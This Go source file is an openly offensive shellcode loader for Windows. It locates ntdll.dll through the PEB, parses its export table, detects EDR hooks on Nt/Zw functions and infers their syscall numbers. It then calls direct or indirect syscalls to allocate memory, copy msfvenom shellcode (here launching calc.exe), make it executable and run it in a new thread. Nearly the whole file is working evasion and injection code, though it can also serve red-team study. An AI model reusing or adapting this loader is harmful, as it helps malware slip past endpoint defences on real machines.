package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"slices"
	"sort"
	"strings"
	"syscall"
	"unsafe"

	"github.com/jedib0t/go-pretty/v6/table"
	"golang.org/x/sys/windows"
)

type IMAGE_EXPORT_DIRECTORY struct { //offsets
	Characteristics       uint32 // 0x0
	TimeDateStamp         uint32 // 0x4
	MajorVersion          uint16 // 0x8
	MinorVersion          uint16 // 0xa
	Name                  uint32 // 0xc
	Base                  uint32 // 0x10
	NumberOfFunctions     uint32 // 0x14
	NumberOfNames         uint32 // 0x18
	AddressOfFunctions    uint32 // 0x1c
	AddressOfNames        uint32 // 0x20
	AddressOfNameOrdinals uint32 // 0x24
}
type Exportfunc struct {
	funcRVA         uint32  // relative address to the base address of the dll
	functionAddress uintptr // absolute address
	name            string  // name of the exported function
	syscallno       uint16  // SSN
	trampoline      uintptr // syscall ;ret; address location
	isHooked        bool    // Is the function hooked?
}

type dllstruct struct {
	name                   string
	address                uintptr
	exportDirectoryAddress uintptr
	exportDirectory        IMAGE_EXPORT_DIRECTORY
	exportedNtFunctions    []Exportfunc
	exportedZwFunctions    []Exportfunc
}

func main() {
	dll, err := GetStructOfLoadedDll("ntdll.dll")
	if err != nil {
		log.Fatalln(err)
	}

	dll.getExportTableAddress()
	dll.GetImageExportDirectory()
	dll.GetModuleExports()
	dll.UnhookFuncs()

	//// Shellcode runner /////
	//msfvenom -p windows/x64/exec CMD=calc.exe -f hex
	sc, _ := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500")
	modntdll := syscall.NewLazyDLL("Ntdll.dll")
	procrtlMoveMemory := modntdll.NewProc("RtlMoveMemory")

	/*
		1. NtAllocateVirtualMemory == VirtualAlloc
		2. rtlMoveMemory
		3. NtProtectVirtualMemory == VirtualProtect
		4. NtCreateThreadEx == CreateThread
	*/

	pHandle := windows.CurrentProcess()
	addr, err := dll.NtAllocateVirtualMemorySyscall("NtAllocateVirtualMemory", uintptr(pHandle), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		log.Fatalf("NtAllocateVirtualMemorySyscall: Failed to allocate memory %v\n", err)
	}
	fmt.Printf("	[+] Allocated Memory Address: 0x%x\n", addr)

	procrtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	fmt.Println("[!] Wrote shellcode bytes to destination address")

	var oldProtect uint32

	err = dll.NtProtectVirtualMemory("NtProtectVirtualMemory", uintptr(pHandle), addr, uintptr(len(sc)), uintptr(windows.PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		log.Fatalf("NtProtectVirtualMemory Failed: %v", err)
	}
	_, err = dll.NtCreateThreadEx("NtCreateThreadEx", uintptr(pHandle), addr)
	if err != nil {
		log.Fatalf("NtCreateThreadEx: Failed to create remote thread %v\n", err)
	}

}

func (dll *dllstruct) NtCreateThreadEx(ntapi string, handle, BaseAddress uintptr) (uintptr, error) {

	/*
	   typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
	     OUT PHANDLE hThread,               1
	     IN ACCESS_MASK DesiredAccess,	    2
	     IN PVOID ObjectAttributes,	        3
	     IN HANDLE ProcessHandle,		    4
	     IN PVOID lpStartAddress,			5
	     IN PVOID lpParameter,				6
	     IN ULONG Flags,					7
	     IN SIZE_T StackZeroBits,			8
	     IN SIZE_T SizeOfStackCommit,		9
	     IN SIZE_T SizeOfStackReserve,		10
	     OUT PVOID lpBytesBuffer			11
	   );
	*/

	var hThread uintptr
	DesiredAccess := uintptr(0x1FFFFF)
	err1, err := dll.Syscall(
		ntapi,
		uintptr(unsafe.Pointer(&hThread)),    //1
		DesiredAccess,                        //2
		0,                                    //3
		uintptr(unsafe.Pointer(handle)),      //4
		uintptr(unsafe.Pointer(BaseAddress)), //5
		0,                                    //6
		uintptr(0),                           //7
		0,                                    //8
		0,                                    //9
		0,                                    //10
		0,
	)
	if err != nil {
		return 0, fmt.Errorf("1 %s %x\n", err, err1)
	}

	fmt.Printf("	[+] Thread Handle: 0x%v\n", hThread)

	syscall.WaitForSingleObject(syscall.Handle(hThread), 0xffffffff)
	return hThread, nil
}

func (dll *dllstruct) NtProtectVirtualMemory(ntapi string, handle, addr uintptr, size uintptr, flNewProtect uintptr, lpflOldProtect uintptr) error {
	err1, err := dll.Syscall(
		ntapi,
		handle,
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&size)),
		flNewProtect,
		lpflOldProtect,
	)
	if err != nil {
		return fmt.Errorf("1 %s %x\n", err, err1)
	}
	fmt.Println("	[+] Changed memory permissions to PAGE_EXECUTE_READ")

	return nil
}

func (dll *dllstruct) NtAllocateVirtualMemorySyscall(ntapi string, handle uintptr, length uintptr, alloctype int, protect int) (uintptr, error) {
	/*
			__kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(
		  [in]      HANDLE    ProcessHandle, 1
		  [in, out] PVOID     *BaseAddress,  2
		  [in]      ULONG_PTR ZeroBits,      3
		  [in, out] PSIZE_T   RegionSize,    4
		  [in]      ULONG     AllocationType,5
		  [in]      ULONG     Protect        6
		);*/
	// syscall for NtAllocateVirtualMemory

	var BaseAddress uintptr

	err1, err := dll.Syscall(
		ntapi,
		uintptr(unsafe.Pointer(handle)),       //1
		uintptr(unsafe.Pointer(&BaseAddress)), //2
		0,                                     //3
		uintptr(unsafe.Pointer(&length)),      //4
		uintptr(alloctype),                    //5
		uintptr(protect),                      //6
	)
	if err != nil {
		return 0, fmt.Errorf("1 %s %x\n", err, err1)
	}

	return BaseAddress, nil
}

func (dll *dllstruct) Syscall(ntapi string, argh ...uintptr) (errcode uint32, err error) {
	var ssn uint16 = 0

	if strings.HasPrefix(ntapi, "Nt") {
		for _, fun := range dll.exportedNtFunctions {
			if fun.name == ntapi {
				ssn = fun.syscallno
				break
			}
		}

	} else if strings.HasPrefix(ntapi, "Zw") {
		for _, fun := range dll.exportedZwFunctions {
			if fun.name == ntapi {
				ssn = fun.syscallno
				break
			}
		}

	} else {
		return 0, fmt.Errorf("Invalid NT Api function\n")
	}

	if ssn == 0 {
		return 0, fmt.Errorf("Invalid NT Api function\n")
	}
	fmt.Printf("[!] Calling direct syscall: %s SSN: 0x%x \n", ntapi, ssn)

	errcode = bpSyscall(ssn, argh...)

	if errcode != 0 {
		err = fmt.Errorf("non-zero return from syscall")
	}
	return errcode, err
}

func (dll *dllstruct) IndirectSyscall(ntapi string, argh ...uintptr) (errcode uint32, err error) {
	var ssn uint16 = 0
	var trampoline uintptr = 0

	if strings.HasPrefix(ntapi, "Nt") {
		for _, fun := range dll.exportedNtFunctions {
			if fun.name == ntapi {
				ssn = fun.syscallno
				trampoline = fun.trampoline
				break
			}
		}

	} else if strings.HasPrefix(ntapi, "Zw") {
		for _, fun := range dll.exportedZwFunctions {
			if fun.name == ntapi {
				ssn = fun.syscallno
				trampoline = fun.trampoline
				break
			}
		}

	} else {
		return 0, fmt.Errorf("Invalid NT Api function\n")
	}

	if ssn == 0 && trampoline == 0 {
		return 0, fmt.Errorf("Invalid NT Api function\n")
	}

	fmt.Printf("[!] Calling Indirect syscall: %s SSN: 0x%x Trampoline: %x\n", ntapi, ssn, trampoline)
	errcode = execIndirectSyscall(ssn, trampoline, argh...)
	if errcode != 0 {
		err = fmt.Errorf("non-zero return from syscall")
	}
	return errcode, err
}

func execIndirectSyscall(ssn uint16, trampoline uintptr, argh ...uintptr) (errcode uint32)

func bpSyscall(ssn uint16, argh ...uintptr) (errcode uint32)

func (dll *dllstruct) PrintExports() {
	noPrint := []string{"NtQuerySystemTime", "ZwQuerySystemTime"}

	tNt := table.NewWriter()
	tNt.AppendHeader(table.Row{"#", "Function Address", "Function Name", "SysCallNo (SSN)", "Trampoline", "Hooked?"})
	for i, fun := range dll.exportedNtFunctions {
		if slices.Contains(noPrint, fun.name) {
			continue
		}
		tNt.AppendRow(table.Row{i, fmt.Sprintf("0x%x", fun.functionAddress), fun.name, fmt.Sprintf("0x%x", fun.syscallno), fmt.Sprintf("0x%x", fun.trampoline), fun.isHooked})
	}
	tZw := table.NewWriter()
	tZw.AppendHeader(table.Row{"#", "Function Address", "Function Name", "SysCallNo (SSN)", "Trampoline", "Hooked?"})
	for i, fun := range dll.exportedZwFunctions {
		if slices.Contains(noPrint, fun.name) {
			continue
		}
		tZw.AppendRow(table.Row{i, fmt.Sprintf("0x%x", fun.functionAddress), fun.name, fmt.Sprintf("0x%x", fun.syscallno), fmt.Sprintf("0x%x", fun.trampoline), fun.isHooked})
	}
	fmt.Println(tNt.Render())
	fmt.Println(tZw.Render())
}

func (dll *dllstruct) UnhookFuncs() {
	for i, fun := range dll.exportedNtFunctions {
		if fun.isHooked {

			dll.exportedNtFunctions[i].syscallno = dll.exportedNtFunctions[i-1].syscallno + 1
			dll.exportedNtFunctions[i].isHooked = false
		}
	}
	for i, fun := range dll.exportedZwFunctions {
		if fun.isHooked {
			dll.exportedZwFunctions[i].syscallno = dll.exportedZwFunctions[i-1].syscallno + 1
			dll.exportedZwFunctions[i].isHooked = false
		}
	}
}

func (fun *Exportfunc) GetSyscallNumbers(address uintptr) {

	funcbytes := (*[5]byte)(unsafe.Pointer(fun.functionAddress))[:]

	if funcbytes[0] == 0x4c && funcbytes[1] == 0x8b && funcbytes[2] == 0xd1 && funcbytes[3] == 0xb8 { // Check if the function is hooked.
		fun.syscallno = *(*uint16)(unsafe.Pointer(&funcbytes[4])) // Get Syscall Number
		fun.isHooked = false
	} else {
		fun.syscallno = 0xffff // when hooked set the syscall number 0xff
		fun.isHooked = true
	}

	//fmt.Printf("Func RVA: %x , nameRVA: %x , name: %s, syscallno : %x\n", exFunc.funcRVA, exFunc.nameRVA, exFunc.name, exFunc.syscallno)

}

func (dll *dllstruct) GetModuleExports() {

	exclusions := []string{"NtdllDefWindowProc_A", "NtdllDefWindowProc_W", "NtdllDialogWndProc_A", "NtdllDialogWndProc_W", "NtGetTickCount"}

	var absAddress uintptr

	for i := 0; i < int(dll.exportDirectory.NumberOfNames); i++ {
		funcRVA := *((*uint32)(unsafe.Pointer(dll.address + (uintptr(dll.exportDirectory.AddressOfFunctions) + uintptr((i+1)*0x4)))))
		nameRVA := *((*uint32)(unsafe.Pointer(dll.address + (uintptr(dll.exportDirectory.AddressOfNames) + uintptr(i*0x4)))))
		nameAddr := dll.address + uintptr(nameRVA)
		nameRVAbyte := (*[4]byte)(unsafe.Pointer(nameAddr))[:]
		name := windows.BytePtrToString(&nameRVAbyte[0])

		absAddress = dll.address + uintptr(funcRVA)
		for j := 0; j < 100; j++ {
			if *(*byte)(unsafe.Pointer(absAddress)) == 0x0f {
				if *(*byte)(unsafe.Pointer(absAddress + 1)) == 0x05 {
					if *(*byte)(unsafe.Pointer(absAddress + 2)) == 0xc3 {
						break
					}
				}
			}
			absAddress += 1
		}

		if strings.HasPrefix(name, "Nt") && !slices.Contains(exclusions, name) {
			funcExp := Exportfunc{
				funcRVA:         funcRVA,
				functionAddress: dll.address + uintptr(funcRVA),
				name:            name,
				trampoline:      absAddress,
			}
			funcExp.GetSyscallNumbers(dll.address)
			dll.exportedNtFunctions = append(dll.exportedNtFunctions, funcExp)
		}

		if strings.HasPrefix(name, "Zw") {
			funcExp := Exportfunc{
				funcRVA:         funcRVA,
				functionAddress: dll.address + uintptr(funcRVA),
				name:            name,
				trampoline:      absAddress,
			}
			funcExp.GetSyscallNumbers(dll.address)
			dll.exportedZwFunctions = append(dll.exportedZwFunctions, funcExp)
		}

	}
	sort.SliceStable(dll.exportedNtFunctions, func(i, j int) bool {
		return (dll.exportedNtFunctions)[i].funcRVA < (dll.exportedNtFunctions)[j].funcRVA
	})
	sort.SliceStable(dll.exportedZwFunctions, func(i, j int) bool {
		return (dll.exportedZwFunctions)[i].funcRVA < (dll.exportedZwFunctions)[j].funcRVA
	})
}

// Get Image Export directory. We are interested in
// - AddressofFunctions
// - AddressOfNames
// - AddressOFNameOrdinals (maybe in the future)
// - Number of functions
func (dll *dllstruct) GetImageExportDirectory() {

	dll.exportDirectory.Characteristics = *((*uint32)(unsafe.Pointer(dll.exportDirectoryAddress)))
	dll.exportDirectory.TimeDateStamp = *((*uint32)(unsafe.Pointer(dll.exportDirectoryAddress + 0x4)))
	dll.exportDirectory.MajorVersion = *((*uint16)(unsafe.Pointer(dll.exportDirectoryAddress + 0x8)))
	dll.exportDirectory.MinorVersion = *((*uint16)(unsafe.Pointer(dll.exportDirectoryAddress + 0xa)))
	dll.exportDirectory.Name = *((*uint32)(unsafe.Pointer(dll.exportDirectoryAddress + 0xc)))
	dll.exportDirectory.Base = *((*uint32)(unsafe.Pointer(dll.exportDirectoryAddress + 0x10)))
	dll.exportDirectory.NumberOfFunctions = *((*uint32)(unsafe.Pointer(dll.exportDirectoryAddress + 0x14)))
	dll.exportDirectory.NumberOfNames = *((*uint32)(unsafe.Pointer(dll.exportDirectoryAddress + 0x18)))
	dll.exportDirectory.AddressOfFunctions = *((*uint32)(unsafe.Pointer(dll.exportDirectoryAddress + 0x1c)))
	dll.exportDirectory.AddressOfNames = *((*uint32)(unsafe.Pointer(dll.exportDirectoryAddress + 0x20)))
	dll.exportDirectory.AddressOfNameOrdinals = *((*uint32)(unsafe.Pointer(dll.exportDirectoryAddress + 0x24)))

}

func (dll *dllstruct) getExportTableAddress() uintptr {
	e_lfanew := *((*uint32)(unsafe.Pointer(dll.address + 0x3c)))
	ntHeader := dll.address + uintptr(e_lfanew)
	fileHeader := ntHeader + 0x4
	// https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header
	optionalHeader := fileHeader + 0x14 // 0x14 is the size of the image_file_header struct
	exportDir := optionalHeader + 0x70  // offset to export table
	exportDirOffset := *((*uint32)(unsafe.Pointer(exportDir)))
	dll.exportDirectoryAddress = dll.address + uintptr(exportDirOffset)
	return dll.exportDirectoryAddress
}

func GetStructOfLoadedDll(name string) (dllstruct, error) {
	modules := ListDllFromPEB()
	for _, module := range modules {
		if module.name == name {
			return module, nil
		}

	}
	return dllstruct{}, fmt.Errorf("dll not Found")
}

func PrintModules() {
	t := table.NewWriter()
	fmt.Printf("---------------------------------------------\nLoaded modules in current process\n")
	t.AppendHeader(table.Row{"#", "DLL Name", "Address"})

	for i, module := range ListDllFromPEB() {
		t.AppendRow(table.Row{i, module.name, fmt.Sprintf("0x%x", module.address)})
	}
	fmt.Println(t.Render())
}

// adds all loaded modules and their base addresses in a slice
func ListDllFromPEB() []dllstruct {

	peb := windows.RtlGetCurrentPeb()
	moduleList := peb.Ldr.InMemoryOrderModuleList
	a := moduleList.Flink
	loadedModules := []dllstruct{}
	for {

		listentry := uintptr(unsafe.Pointer(a))
		// -0x10 beginning of the _LDR_DATA_TABLE_ENTRY_ structure
		// +0x30 Dllbase address
		// +0x58 +0x8 address holding the address pointing to base dllname
		// offsets different for 32-bit processes
		DllBase := uintptr(listentry) - 0x10 + 0x30
		BaseDllName := uintptr(listentry) - 0x10 + 0x58 + 0x8

		v := *((*uintptr)(unsafe.Pointer(BaseDllName)))
		//fmt.Printf("%p\n", (unsafe.Pointer(v))) // prints the address that holds the dll name

		s := ((*uint16)(unsafe.Pointer(v))) // turn uintptr to *uint16
		dllNameStr := windows.UTF16PtrToString(s)
		if dllNameStr == "" {
			break
		}

		dllbaseaddr := *((*uintptr)(unsafe.Pointer(DllBase)))
		//fmt.Printf("%p\n", (unsafe.Pointer(dllbaseaddr))) // prints the dll base addr
		loadedModules = append(loadedModules, dllstruct{
			name:                   dllNameStr,
			address:                dllbaseaddr,
			exportDirectoryAddress: 0,
			exportDirectory:        IMAGE_EXPORT_DIRECTORY{Characteristics: 0, TimeDateStamp: 0, MajorVersion: 0, MinorVersion: 0, Name: 0, Base: 0, NumberOfFunctions: 0, NumberOfNames: 0, AddressOfFunctions: 0, AddressOfNames: 0, AddressOfNameOrdinals: 0},
			exportedNtFunctions:    []Exportfunc{},
			exportedZwFunctions:    []Exportfunc{},
		})
		a = a.Flink
	}

	return loadedModules
}
